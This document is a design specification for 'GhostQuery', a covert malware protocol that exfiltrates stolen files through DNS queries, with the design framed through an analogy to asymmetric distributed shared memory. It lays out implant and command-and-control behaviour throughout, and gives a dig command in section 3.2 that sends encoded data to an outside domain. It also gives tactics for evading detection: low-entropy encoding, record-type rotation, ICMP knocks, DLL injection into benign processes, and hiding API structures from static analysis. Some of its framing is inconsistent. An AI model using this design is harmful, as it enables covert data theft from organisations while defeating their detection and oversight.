# GhostQuery: An Asymmetric DNS Exfiltration Protocol Inspired by ADSM

## Introduction

> Modern endpoint‑detection and response (EDR) products monitor system calls, file accesses and network activity to detect malicious behaviour. Network detection and response (NDR) appliances complement EDR by analysing traffic at the perimeter, but in many organisations there is little visibility into internal east–west traffic.

GhostQuery is a **covert communication protocol that abuses the Domain Name System (DNS) hierarchy** to create a stealthy data‑exfiltration channel. The goal is not merely to tunnel data; GhostQuery strives to make its traffic indistinguishable from legitimate DNS traffic patterns by embracing the principles of asymmetric distributed shared memory (ADSM).

**ADSM**, introduced by Gelado et al. for heterogeneous computing systems, provides a shared logical memory space where CPUs can access objects in accelerator memory but accelerators cannot directly access CPU memory. This asymmetry simplifies the implementation of coherence protocols, reduces thrashing and improves programmability.

GhostQuery borrows this idea: the implant (the “writer”) is able to write into a shared logical namespace (a DNS hierarchy) but the controller (the “reader”) cannot actively retrieve data; instead it passively waits for queries. By modelling the exfiltration channel as a pull‑based, release‑consistent memory subsystem, disguises data transfers as routine DNS look‑ups and responses.

## 1 High‑level Architecture

GhostQuery operates on a **pull‑based** consistency model: data always flows from the implant to the controller when the controller (via DNS) requests it. This is analogous to ADSM’s asymmetry where the CPU initiates all data transfers and coherence actions. The main components are shown below.

### 1.1 Edge Node (Implant or “Writer”)

- **Role**: Lives inside the compromised internal host and holds the data to be exfiltrated. Like the CPU in ADSM, it is responsible for actively writing to the shared logical memory. Network firewalls usually block inbound connections to the host, so the implant cannot serve data—only send it.
- **Memory management**: The implant implements a release consistency model. Data is buffered and encrypted locally and only released (transmitted) during specific windows triggered by ICMP signals from the controller. ADSM employs release consistency where shared objects are released by the CPU on kernel invocation and acquired on kernel return; GhostQuery uses ICMP “interrupts” to play the role of acquire and release signals.
- **Behaviour**: The file to exfiltrate is chunked into fixed‑size blocks. Each block is mapped into a logical address in the DNS namespace. For example, a 32‑bit block 0xDEADBEEF mapped to sequence number 100 results in a DNS query like deadbeef.seq-100.`<domain>`. Each query encodes one block of data in the subdomain.

### 1.2 Master Node (C2 Controller or “Reader”)

- **Role**: Implements a custom authoritative name server for the exfiltration domain (e.g., *.updates.sys-cdn.net). It acts as a passive reader that maintains a shadow memory of the file being exfiltrated, similar to how the ADSM runtime maintains a copy of shared data on the CPU side.
- **Lazy synchronisation**: The controller cannot force the client to send data, just as the accelerator in ADSM cannot initiate coherence actions. It waits for the implant’s DNS query (the “acquire” signal) to capture data. If a query is missing (a UDP drop), the controller uses the DNS response to request retransmission, mimicking page faults and dirty–bit handling.
- **State reconstruction**: As queries arrive, the controller reconstructs the file in its shadow memory. When it detects a gap (e.g., chunk‑003 arrived but chunk‑002 did not), it encodes a fault in the DNS response by returning a specific A record (e.g., 127.0.0.2). The implant interprets this as a “dirty bit” and rolls back to retransmit the missing chunk, similar to how the ADSM runtime uses page faults and state transitions to maintain coherence.

### 1.3 DNS Hierarchy as Shared Bus

> In ADSM, the shared logical memory spans the CPU and accelerator, whereas in GhostQuery the DNS namespace becomes the shared address space.

The DNS hierarchy ``[session].[sequence].[payload].<domain>`` acts as a high‑bandwidth bus for upstream data (implant → controller). The controller’s DNS responses (A, AAAA, TXT etc.) carry low‑bandwidth control information back to the implant, similar to the control bus in the ADSM run‑time. ICMP packets are used as side‑channel “hardware interrupts” to coordinate when high‑volume DNS transactions should occur, much like the hardware interrupts used in ADSM to avoid thrashing.

## 2 Detailed System Components

### 2.1 Edge Node (“Writer”)

1. **Chunking and encoding**: The implant splits the target file into fixed‑sized chunks and encodes each chunk into a subdomain. To avoid the high entropy of Base64‑encoded names, GhostQuery uses Base32 or hexadecimal encoding mapped to a dictionary of common English prefixes and suffixes. This reduces Shannon entropy and makes the queries resemble legitimate hostnames. ADSM highlights that thrashing and false sharing are reduced when sharing is done at data‑object granularity; similarly, GhostQuery’s fixed‑size chunks make state management simpler.
2. **Buffering and release**: Data is not streamed continuously. The implant buffers chunks and releases them only during authorised windows triggered by ICMP “knocks.” This is analogous to the release consistency in ADSM where data is released/acquired at method invocation/return boundaries.
3. **Logical addressing**: Each DNS query is formed as sessionID.sequence.payload.domain. The sessionID identifies the transfer, sequence numbers the chunk and implicitly defines the logical address, and payload holds the encoded data.
4. **Retransmission logic**: When the controller returns a special A record (e.g., 127.0.0.2) to indicate a dirty bit, the implant interprets this as a page fault and retransmits the corresponding chunk. This parallels the state transitions in ADSM’s lazy‑update and rolling‑update protocols where dirty/invalidate states trigger data transfers.
5. **Process integration**: The implant uses system calls like DnsQuery() inside a compiled binary or a DLL injected into a benign process. This keeps the behaviour within normal API usage patterns and helps evade EDR heuristics.

### 2.2 Authoritative Controller (“Reader”)

1. **Authoritative DNS server**: The controller runs a name server authoritative for the exfiltration domain. It listens for incoming queries and serves as a passive reader. In ADSM, the CPU drives all coherence actions; likewise, GhostQuery’s server never initiates connections—its responses are purely reactive.
2. **Shadow memory and gap detection**: The controller maintains a shadow copy of the exfiltrated file. It tracks sequence numbers and detects missing chunks. If a chunk arrives out of order, it signals a gap via a special DNS response so the implant can retransmit. This is similar to ADSM’s memory coherence protocols that track invalid, dirty and read‑only states and trigger transfers on state transitions.
3. **Multi‑record responses**: To maintain stealth and avoid detection by EDR heuristics that monitor unusual record types, the controller rotates through A/AAAA, CNAME, MX, and TXT record responses. For instance, an A or AAAA response can embed command codes in the least significant octets (e.g., 127.0.0.10 → command 10 = sleep), while a CNAME response can return a slightly larger payload. This mirrors how ADSM uses multiple coherence protocols and API calls to adapt to different scenarios.

### 2.3 Transport Layer (DNS + Side‑Channel)

1. **Upstream bus**: The QNAME field in DNS queries carries the encoded data chunk. Because DNS queries can be up to 255 characters, this provides a reasonably high‑bandwidth unidirectional channel. By embedding the data in the subdomain rather than in resource records, GhostQuery avoids detection by simple TXT‑record heuristics.
2. **Downstream bus**: The RDATA field in the DNS response (A/AAAA/CNAME/MX/TXT) carries command and control information. This is a low‑bandwidth channel used to acknowledge receipt, request retransmission or send commands (e.g., sleep, terminate). ADSM also separates the data and control paths: data transfers are directed by the CPU and signalling occurs through interrupt mechanisms.
3. **ICMP side‑channel**: Small ICMP echo requests act as hardware interrupts to synchronise the implant and controller. These interrupts open or close transmission windows, reducing the chance of detection from sustained DNS traffic bursts. The ADSM paper highlights the use of hardware interrupts to avoid thrashing and reduce the need for shared synchronisation variables.

## 3 Data Flow and Consistency Workflow

### 3.1 Session Initialization (Allocation)

1. **Session ID and file hash**: The implant allocates a logical buffer by generating a sessionID and computing a hash of the file to exfiltrate. It sends this information via an ICMP interrupt to the controller. This establishes the logical memory map without triggering DNS heuristics.
2. **Mapping to logical memory**: The controller records the session metadata and allocates a shadow memory buffer. This step mirrors the adsmAlloc() call in ADSM, which allocates a shared memory region accessible by both CPU and accelerator.

### 3.2 Migration (Exfiltration)

1. **Sliding window**: GhostQuery uses a sliding window algorithm to control the number of outstanding DNS queries. This prevents flooding the network and allows the controller to detect dropped queries. Each window corresponds to a set of contiguous sequence numbers.
2. **Encoding and queries**: For each chunk, the implant constructs a DNS query: dig @internal_dns A <encoded_data>.chunk-001.sessionID.domain.com. The internal resolver forwards the query up the hierarchy until it reaches the authoritative server. On success, the server returns an NXDOMAIN response to indicate “write successful,” closing the connection.
3. **Buffer management**: The implant buffers unsent chunks and retransmits them if the controller signals a fault. The release-consistency model ensures that data is only transferred during designated windows, minimising anomalies in network traffic.

### 3.3 Coherence (Error Correction)

1. **Success case**: When the controller receives a chunk in order, it writes the data to the shadow memory and responds with an NXDOMAIN or a benign A record. This indicates that the write is complete.
2. **Gap detection**: If a query arrives with sequence n+1 but the controller has not received n, it returns a special A record (e.g., 127.0.0.2) to signal a dirty‑bit. The implant interprets this as a page fault and rolls back to retransmit the missing chunk. In ADSM’s lazy‑update protocol, a page fault triggers data transfer from accelerator to system memory; GhostQuery uses the same principle to maintain a consistent shadow memory.
3. **Rolling update**: To improve performance, GhostQuery may adopt a rolling update strategy analogous to ADSM’s rolling‑update coherence protocol. Data is divided into fixed‑size blocks, and only a limited number of blocks can be outstanding (dirty) at once. If the number of dirty blocks exceeds the rolling size, the oldest block is retransmitted and marked clean. This balances throughput and detection risk.

### 3.4 Completion (De‑allocation)

1. **Final release**: Once all chunks have been transferred and acknowledged, the implant sends a final “release” signal via ICMP or a special DNS TXT query. The controller verifies the file hash and closes the session.
2. **Shadow reconstruction**: The controller concatenates the chunks in order and reconstructs the file. The session metadata is cleared. In ADSM terms, this mirrors the adsmFree() call that releases the shared memory region.

## 4 Protocol Design for Stealth and Detection Evasion

### 4.1 Addressing Indicators of Compromise (IoCs)

> Threat hunters monitor for high‑entropy hostnames, high volumes of TXT queries, and unusual record types. GhostQuery mitigates these IoCs as follows:

1. **Low‑entropy encoding**: Instead of Base64 in TXT records, GhostQuery uses Base32 or hex mapped to human‑readable prefixes and suffixes. This reduces Shannon entropy and makes hostnames appear like legitimate CDN or update servers (e.g., cdn-img-02.example.com rather than x82za.example.com).
2. **Multi‑record rotation**: GhostQuery rotates through multiple DNS record types—A/AAAA, CNAME and MX—to blend in with normal traffic. A records embed command codes in the least significant bits of the returned IP address; CNAME responses allow slightly larger upstream payloads; MX lookups mimic mail server traffic. This rotation mirrors the multiple coherence protocols available in ADSM—choosing the right protocol (record type) based on context.
3. **Realistic TTL values**: To avoid suspicion, the controller sets realistic TTL values on its responses so that internal resolvers cache them. ADSM emphasises that efficient memory management and caching reduce thrashing; similarly, caching legitimate‑looking responses reduces query volume.
   Traffic shaping and sleeping: The implant monitors system activity and only transmits during periods of high DNS activity (e.g., software updates). The controller can instruct the implant to sleep by returning a special code (e.g., 127.0.0.10 for sleep). This reduces the appearance of high‑volume bursts.

### 4.2 Additional Tactics

1. **Process monitoring and injection**: The implant calls DNS APIs (e.g., DnsQuery) via a compiled binary or injected DLL. Running inside legitimate processes (e.g., a browser or updater) helps hide network activity. ADSM emphasises that portability and legacy support are advantages of the data‑centric model; similarly, integration into existing processes reduces the footprint.
2. **Dictionary‑based entropy checks**: Both implant and controller share a dictionary of common tokens. Binary data is mapped to human‑readable substrings, avoiding obviously random hostnames. This dictionary can be updated to mimic the naming conventions of the target environment.
3. **TTL manipulation and caching**: Setting realistic TTLs ensures internal resolvers cache responses, reducing the number of queries seen by external sensors.
4. **I/O and bulk operations**: When large amounts of data must be exfiltrated, GhostQuery borrows ideas from ADSM’s treatment of I/O operations. ADSM overloads I/O calls and bulk memory operations to avoid restarting system calls after page faults. GhostQuery uses a similar technique: the implant breaks large transfers into block‑sized windows to avoid overwhelming DNS caches and ensures that dropped queries can be retransmitted without restarting the entire transfer.

## 5 Software Architecture and Requirements

### 5.1 System Architecture and Design Pattern

GhostQuery’s software architecture follows a **layered, event‑driven design**. Each major concern—encoding/decoding, transport, session management and control logic—is encapsulated in its own module, and modules communicate via asynchronous events. In an **event‑driven architecture**, components generate and respond to events rather than polling or maintaining tight couplings. By decoupling services through asynchronous communication, event‑driven architectures create scalable, resilient and adaptable systems. Within GhostQuery, events such as ICMP “interrupts,” DNS queries and DNS responses act as messages. The implant reacts to ICMP signals by opening or closing transmission windows, while the controller reacts to DNS queries by sending acknowledgements or retransmission requests. This event‑driven pattern avoids blocking operations and allows modules to evolve independently.

This architecture provides **flexibility and decentralised communication**—components can be updated or replaced independently without affecting the rest of the system. Vallabhaneni’s 2025 review of event‑driven architectures reports that organisations adopting EDA observed enhanced scalability, resilience and reduced integration complexity. In GhostQuery, additional implants can be deployed or additional controllers can be added without altering the core modules. The asynchronous design ensures that network I/O is non‑blocking: the implant can prepare chunks while waiting for DNS responses, and the controller can handle multiple queries concurrently. Such **loose coupling** also supports horizontal scaling and fault tolerance.

### 5.2 Functional Requirements

Functional requirements describe **behaviours that the system will exhibit under specific conditions**—they answer the question *“What must the software do?”*. For GhostQuery, the core functional requirements are:

1. **Session management:** The system must establish sessions identified by a unique `sessionID` and file hash. It must allocate logical buffer space for the file and handle session termination.
2. **Chunking and encoding:** The implant must read the target file, split it into fixed‑size chunks and encode each chunk using low‑entropy encoding (Base32/hex mapped to a dictionary). This includes mapping chunks to logical DNS addresses.
3. **Transport of chunks:** The system must construct DNS queries (`A`, `AAAA`, `CNAME`, `MX` or `TXT`) for each chunk and send them through the internal DNS resolver to the authoritative controller. It must handle sliding window transmission to prevent congestion.
4. **Acknowledgement and error handling:** Upon receiving DNS responses, the implant must interpret control codes (e.g., NXDOMAIN, command in A record) and retransmit missing chunks if a dirty‑bit is signalled. It must maintain a resend queue for dropped or out‑of‑order queries.
5. **Control signalling:** The controller must send commands back to the implant via the DNS response (e.g., instructing sleep or termination) and via ICMP side‑channel triggers. The implant must respond accordingly.
6. **Session completion:** After all chunks are transferred, the system must verify integrity via file hash and release the logical buffer.
7. **Encryption and obfuscation**: The system must encrypt the file content prior to encoding into DNS queries to ensure confidentiality during transmission. To avoid triggering entropy‑based detection, the encoding must use dictionary‑based substitution, where binary data is mapped to realistic‑looking subdomain labels (e.g.,` cdn‑img‑02 rather than random strings`). Using meaningful prefixes and suffixes reduces the Shannon entropy of hostnames; research on DNS tunnelling detection notes that legitimate domain names often contain dictionary words, whereas encoded names have high entropy and an even character distribution
8. **Instruction dictionary and mapping**: The client and server must share a dictionary of instruction tokens that map encoded binary values to specific domain labels. This dictionary defines how to translate binary data into “fake words” (e.g., cdn‑img‑02) and how to decode them on the controller side. Maintaining a shared dictionary ensures that both ends interpret the encoded data consistently while retaining low entropy.
9. **Opaque API usage**: When interacting with Windows APIs or similar system interfaces, the implant should avoid including imported structure definitions directly from system headers. Instead, it must redeclare necessary structs within its own code. This reduces the number of obvious API references in the binary, helping to evade static analysis signatures that rely on known data structures.

These functional requirements ensure the protocol provides the necessary operations to exfiltrate data covertly while managing state and reliability.

### 5.3 Non‑Functional Requirements

Non‑functional requirements describe **properties or constraints** that a system must exhibit rather than specific behaviours it must implement. Wiegers and Beatty define a non‑functional requirement as “a description of a property or characteristic that a system must exhibit or a constraint that it must respect”. These requirements often relate to **quality attributes**—such as performance, reliability, maintainability or security—that influence how well the system operates. For GhostQuery, the non‑functional requirements include:

1. **Performance:** The protocol should minimise network overhead and operate within typical DNS traffic volumes. Chunk sizes and window sizes must be tuned to maintain throughput without overwhelming DNS resolvers.
2. **Stealth and security:** Communications must blend into legitimate traffic by using low‑entropy encoding and rotating record types. Responses must set realistic TTLs to enable caching. Data must be encrypted end‑to‑end to prevent interception or tampering. As non‑functional constraints, stealth and security relate to the protocol’s ability to satisfy confidentiality and integrity requirements without exposing unusual patterns to EDR or NDR systems.
3. **Reliability:** The system must handle UDP packet loss gracefully, using sliding/rolling window algorithms and retransmission mechanisms. It must ensure that the entire file is reconstructed correctly on the controller side even in the presence of network failures.
4. **Scalability:** The architecture should support multiple concurrent sessions and handle files of varying sizes. An **event‑driven** design—where components communicate via asynchronous events rather than direct calls—naturally decouples producers and consumers. In a 2025 study of event‑driven architectures, Vallabhaneni notes that decoupling services through asynchronous communication enables scalable, resilient and adaptable systems. Applying this pattern to GhostQuery allows the implant and controller to operate independently and scale horizontally.
5. **Maintainability and modifiability:** The codebase must be modular, with clearly defined interfaces between modules (encoding, transport, state management, control logic). This facilitates updates, bug fixes and adaptation to new detection heuristics. Modular design also aids reuse of components across different malware families.
6. **Usability (for operators):** Command and control operators should have an easy interface to initiate sessions, monitor progress, request retransmissions and issue commands. Logging and error reporting should be clear and actionable.

### 5.4 Technology Choice: Rust vs C++

Selecting a systems programming language for GhostQuery’s implementation is crucial because **memory safety**, **concurrency** and **performance** directly influence the protocol’s reliability and stealth. C++ has long dominated high‑performance domains, yet it relies on manual memory management and places the burden of preventing data races and buffer overflows on programmers. Academic studies comparing Rust and C++ suggest that Rust offers comparable performance while substantially reducing complexity. A 2020 case‑study at KTH Royal Institute of Technology implemented a multithreaded key‑value store in Java, Rust and C++. The authors found that *Rust and C++ displayed roughly equal performance*, whereas *Java was measurably slower*. However, **C++ required significantly more lines of code than Rust**, leading to the conclusion that Rust was the best‑suited language for the task.

Rust’s advantages stem from language features designed to ensure memory safety without a garbage collector. The same KTH report notes that Rust makes it easier to produce concurrent and memory‑safe applications by eliminating null pointers and employing a **borrowing system** that prevents common memory‑safety bugs. Rust’s **zero‑cost abstractions** and **excellent tooling** enable developers to achieve high performance without runtime overhead. Moreover, Rust has no garbage collector and helps avoid memory leaks. These design choices mean that the compiler enforces ownership and lifetime rules at compile time, preventing data races and dangling pointers before the program runs.

In contrast, C++ allows low‑level control over memory and can achieve high performance but offers no intrinsic protection against misuse. Buffer overflows, double frees and data races are common sources of vulnerabilities in C++ code. While disciplined programming and static analysis can mitigate some risks, the overhead of writing and maintaining secure C++ code is higher, as evidenced by the increased lines of code in the KTH study.

Rust’s ecosystem also promotes developer productivity. Its package manager (Cargo) automates dependency management and compilation across platforms, and its growing library ecosystem includes crates for DNS queries, encryption and asynchronous I/O—functions essential to GhostQuery. Given the need for **memory safety**, **concurrency**, **maintainability** and **portability**, Rust offers a compelling balance between low‑level control and high‑level safety. On the basis of academic evidence and the protocol’s requirements, **Rust is a more appropriate choice than C++** for implementing GhostQuery.

## 6 Parallels to the ADSM Model

GhostQuery draws inspiration from the **asymmetric distributed shared memory** paradigm in several ways:

1. **Asymmetry:** In ADSM, the CPU can access objects in accelerator memory but not vice versa; in GhostQuery, the implant pushes data to the controller, but the controller cannot initiate requests. This asymmetry enables simple implementations on the controller side and reduces the attack surface.
2. **Release consistency:** ADSM uses a release consistency model with implicit acquire/release semantics at method boundaries. GhostQuery implements this by buffering data and releasing it only during authorised windows signalled by ICMP “interrupts.” This reduces network noise and matches the natural boundaries of legitimate traffic flows.
3. **Memory coherence protocols:** The ADSM run‑time supports multiple coherence protocols—batch‑update, lazy‑update and rolling‑update—to trade off between data transfer volume and synchronisation cost. GhostQuery similarly rotates among different DNS record types and uses sliding or rolling window algorithms to balance throughput and stealth.
4. **Shadow memory and state tracking:** ADSM maintains a shadow copy of data on the CPU and tracks invalid, dirty and read‑only states. GhostQuery’s controller maintains a shadow memory of the file and uses special responses to signal missing or dirty chunks, effectively implementing a simple state machine.
5. **I/O and bulk operations:** ADSM overloads I/O and bulk memory calls to avoid restarting system calls after page faults. GhostQuery applies similar logic when exfiltrating large files: it subdivides transfers into manageable windows and ensures that dropped or delayed packets do not require restarting the entire transfer.
6. **Programmer/API simplicity:** ADSM provides a minimal API (`adsmAlloc`, `adsmFree`, `adsmCall`, `adsmSync`) that reduces programming effort. GhostQuery abstracts the complexity of DNS exfiltration behind a simple interface: initialise session (`alloc`), send chunks (`write`), handle retransmission (`sync`) and close session (`free`). This modularity allows the implant to be integrated into various malware or tooling with little additional code.

## 7 Conclusion

GhostQuery is a stealthy DNS‑based exfiltration protocol that uses ideas from *asymmetric distributed shared memory* to evade modern EDR and exploit the lack of internal NDR. By treating the DNS namespace as a **shared logical memory space** and the implant/controller pair as a **writer/reader** in an ADSM‑like model, GhostQuery achieves asymmetric, release‑consistent data transfer while blending into legitimate network traffic. Multi‑record rotation, low‑entropy encoding and realistic TTLs address common indicators of compromise. Retransmission logic and sliding/rolling window algorithms ensure data integrity without raising alarms. The protocol design demonstrates how concepts from heterogeneous computing—such as release consistency, multiple coherence protocols, and shadow memory—can inspire novel techniques in network covert channels.
